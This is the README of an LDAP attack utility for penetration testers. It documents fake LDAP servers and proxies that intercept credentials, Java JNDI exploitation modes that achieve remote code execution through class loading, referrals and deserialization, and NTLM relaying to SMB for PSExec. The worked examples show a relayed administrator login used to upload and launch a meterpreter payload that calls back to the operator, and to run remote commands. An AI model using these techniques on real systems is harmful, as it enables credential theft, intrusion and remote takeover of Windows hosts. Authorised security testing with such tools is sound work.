# LDAP Swiss Army Knife

Multi-function LDAP server utility.
Quickly setup LDAP server for testing purposes, MitM proxies for 
intercepting plaintext or forwarding NTLM credentials or exploit
various Java JNDI/LDAP Client vulnerabilities.

Author: Moritz Bechler (moritz.bechler@syss.de)
Project Repository: https://github.com/SySS-Research/ldap-swak

## Build

Maven required.
> mvn package verify

-> target/ldap-swak-0.0.3-SNAPSHOT-all.jar


## Run

Just run the JAR file with approriate subcommand and options:
```
> java -jar target/ldap-swak-0.0.3-SNAPSHOT-all.jar 
[...]
LDAP Swiss Army Knife
      --accept-pass=<acceptPass>
                             Accept login using this pass
      --accept-user=<acceptUser>
                             Accept login using this user
      --bind=<bind>          Network address to bind to
      --cert=<certificate>   Certificate file to use (PEM, in conjunction with --key)
      --fakecert-bits=<fakeCertBitsize>
                             RSA keySize when generating private key for fake
                               certificates
                               Default: 2048
      --fakecert-cn=<fakeCertCN>
                             Subject DN to use when creating fake certificates
                               Default: cn=fake
      --fakecert-lifetime=<fakeCertLifetime>
                             Lifetime of fake certificate in days
                               Default: 7
      --fakecert-san=<fakeCertSANs>
                             Fake certificate subject alternative names
      --fakecert-sigalg=<fakeCertSigalg>
                             Signature algorithm to use when generating fake
                               certificates
                               Default: SHA256withRSA
      --fakecert-validfrom=<fakeCertValidFrom>
                             Fake certificate validity start
      --fakecert-validto=<fakeCertValidTo>
                             Fake certificate validity end
      --key=<privateKey>     Private key file to use (PEM, in conjunction with
                               --cert)
      --keystore=<keystore>  Keystore to load key/certificate from
      --keystore-pass=<keystorePass>
                               Default: changeit
      --keystore-type=<keystoreType>
                             Keystore type
                               Default: JKS
      --nostarttls           Disable StartTLS
      --ntlm-relay=<relayServer>
                             Relay intecepted NTLM exchange to SMB server for PSExec
      --psexec-cmd=<psexecCMD>
                             Using the relayed credentials, run system command using
                               PSExec
      --psexec-cmd-log=<psexecCMDLog>
                             Redirect CMD command output to file (filesystem path)
      --psexec-cmd-script-loc=<psexecCMDScriptLoc>
                             SHARE/Path for launcher script file used for output
                               redirection
                               Default: /ADMIN$/Temp/
      --psexec-cmd-script-path=<psexecCMDScriptPath>
                             Local filesystem for launcher script file used for
                               output redirection
                               Default: C:\Windows\Temp\
      --psexec-display-name=<psexecDisplayName>
                             Display name of service used for PSExec
      --psexec-psh-encode    Encode PSExec Powershell Payload
      --psexec-script=<psexecPSHScript>
                             Using the relayed credentials, run Powershell code
                               using PSExec (size limits apply)
      --psexec-script-file=<psexecPSHScriptFile>
                             Using the relayed credentials, run Powershell code from
                               script file using PSExec (size limits apply)
      --psexec-service-name=<psexecServiceName>
                             Name of service used for PSExec
      --relay-read-charset=<readFileCharset>
                             Charset for reading remote files, only relevant when
                               outputting
                               Default: UTF-8
      --relay-read-from=<readFileSource>
                             Using the relayed credentials, read file from this
                               target share/path (SHARE/path/)
      --relay-read-retries=<readFileRetries>
                             Number of retries reading the file, possibly waiting
                               for the command to complete, each 1 second apart
                               Default: 5
      --relay-read-to=<readFileTarget>
                             Local file to store the read file data, leave empty for
                               stdout
      --relay-write-file=<writeFileSource>
                             Using the relayed credentials, write this local file to
                               the server
      --relay-write-to=<writeFileTarget>
                             Using the relayed credentials, write file to this
                               target share/path (SHARE/path/)
      --request-log          Log all requests
      --schemaless           Don't provide any schema
      --server-base-dn=<baseDN>
                             Base DNs to report
      --ssl                  Run a SSL/TLS listener
      --tls-cipher=<tlsCiphers>
                             TLS ciphers to allow
                             see https://docs.oracle.
                               com/javase/9/docs/specs/security/standard-names.html
      --tls-proto=<tlsProtocols>
                             TLS versions to allow (TLS12, TLS11, TLS10, SSLv3,
                               SSLv2}
      --uid-attr=<uidAttrs>  Attributes to extract username from DNs
      --write-creds=<writeCreds>
                             Write intercepted credentials to this file (format:
                               user pass, one per line)
  -h, --help                 Display this help message.
  -p, --port=<port>          Port to bind to (defaults: 389 for normal, 636 for SSL)
  -q, --quiet                Only show warnings and errors
  -v, --verbose              Specify multiple -v options to increase verbosity.
                             For example, `-v -v -v` or `-vvv`
  -V, --version              print version information and exit
Commands:
  fake   Launch fake LDAP server
  proxy  Launch proxy LDAP server
  jndi   Java JNDI Exploits
```

SSL/TLS/StartTLS listeners use a self-signed certificiate if no other 
certificate is provided. --tls-cipher and --tls-proto can be used to 
set the allowed ciphers. However, using legacy algorithms requires 
adjustments to the Java installation's java.security.properties file.
See https://www.java.com/en/configure_crypto.html

## Subcommands - Modes of Operation

### fake - Fake Server
Just intercept credentials or provide some data to the client.

Additional options:
```
 --load=    LDIF file with data to load
 --schema=  LDIF file containing schema definition
            (if the server is not run --schemaless a basic default schema is applied)
```

```
> java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jar fake -p 1389
12:52:32.484 INFO FakeServer - Starting StartTLS listener on *:1389

> ldapsearch -H ldap://localhost:1389/ -ZZ -x -D cn=test -w test
ldap_bind: Invalid credentials (49)

=> 12:53:35.653 INFO CredentialsOperationInterceptor - Intercepted credentials cn=test:test
```

### proxy - Proxy Server
Forward all requests to a set of target servers. 
This also records intercepted credentials.

Additional options:
```
 --server=        Backend servers to connect to
 --proxy-ssl      Connect to backend servers using SSL
 --proxy-starttls Connect to backend servers using StartTLS
 --srv=           Resolve backend server from DNS SRV record
                  (e.g. --srv  _ldap._tcp.dc._msdcs.<AD-Domain>)
```
   
```               
> java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jar proxy -p 2389 --server localhost:1389
12:54:19.695 INFO ProxyServer - Starting StartTLS proxy on *:2389
> ldapsearch -H ldap://localhost:2389/ -ZZ -x -D cn=foo -w test -b cn=test
ldap_bind: Invalid credentials (49)

=> 12:54:47.230 INFO CredentialsOperationInterceptor - Intercepted credentials cn=foo:test
```

### jndi - Java JNDI Exploits

Multiple specific fake server modes for exploiting Java JNDI LDAP clients.
 
#### Reference

Options:
```
--ref-class=     Class to load (ObjectFactory)
--ref-codebase=  URL codebase to load class from
```

For all requests return a JNDI reference object witha ObjectFactory from 
the specified classpath. When a JNDI client makes a request with lookup() 
semantics, this class is loaded and thereby code execution is achieved.

The remote classloading has been disabled by default starting with 
Java 11.0.1, 8u191, 7u201, and 6u211 (CVE-2018-3149).

#### Referral

Options:
```
--referral=	  URI to return as referral
```

JNDI clients that are configured to follow referrals, can be redirected to 
RMI services using rmi: URLs. Accessing these services enables deserialization 
attacks, in misconfigured or outdated Java versions RCE by returning a Reference 
object from the RMI lookup can be achieved. 
(https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/RMIRefServer.java)

#### Serialized object

Options:
```
--serialized=  File containing serialized data to return
```

For all requests returns a serialized Java Objects.
When a JNDI client makes a request with lookup() semantics,
the provided data will be deserialized.


## NTLM Relaying
 
The LDAP servers allow forwarding the NTLM exchange to a remote SMB server.
Often, this grants access to the targeted servers files and RPC interfaces
with the permissions of the authenticating user account.

Three basic operations on the target server are implemented:
- reading files
- executing system commands and powershell (PSExec/SMBExec)
- writing files

The order of operations is a convenient write/execute/read.


For example, upload and launch a meterpreter instance:
```
java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jar ke -p 1389 --ntlm-relay 192.168.56.101 --relay-write-file /tmp/test.exe --relay-write-to 'ADMIN$/Temp/foo.exe' --psexec-cmd "C:\\Windows\\Temp\\foo.exe"
10:36:53.789 INFO FakeServer - Starting StartTLS listener on *:1389
10:36:56.278 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
10:36:56.325 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\foo.exe
10:36:56.333 INFO PassTheHashRunner - Service already exists
10:36:56.337 INFO PassTheHashRunner - Recreated service
10:36:56.355 INFO PassTheHashRunner - Service start timeout, expected: this is not an actual service binary


[*] Meterpreter session 4 opened (192.168.56.1:8443 -> 192.168.56.101:49696) at 2019-02-19 10:36:56 +0100
```

Or, execute a system command and get it's output:
```
java -jar target/ldap-swak-0.0.1-SNAPSHOT-all.jake -p 1389 --ntlm-relay 192.168.56.101  --psexec-cmd "net user" --psexec-cmd-log C:\\Windows\\Temp\\test.log --relay-read-from 'ADMIN$/Temp/test.log'
10:39:09.154 INFO FakeServer - Starting StartTLS listener on *:1389
10:39:12.564 INFO PassTheHashNTLMSASLBindHandler - Have NTLM login administrator@DESKTOP-L96LL3H
10:39:12.600 INFO PassTheHashRunner - Command line %COMSPEC% /b /c start /b /min C:\Windows\Temp\launch-1550569151302.cmd
10:39:12.610 INFO PassTheHashRunner - Service already exists
10:39:12.614 INFO PassTheHashRunner - Recreated service
10:39:12.632 INFO PassTheHashRunner - Service start timeout, expected: this is not an actual service binary

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
mbechler                 WDAGUtilityAccount       
The command completed with one or more errors.
```
 
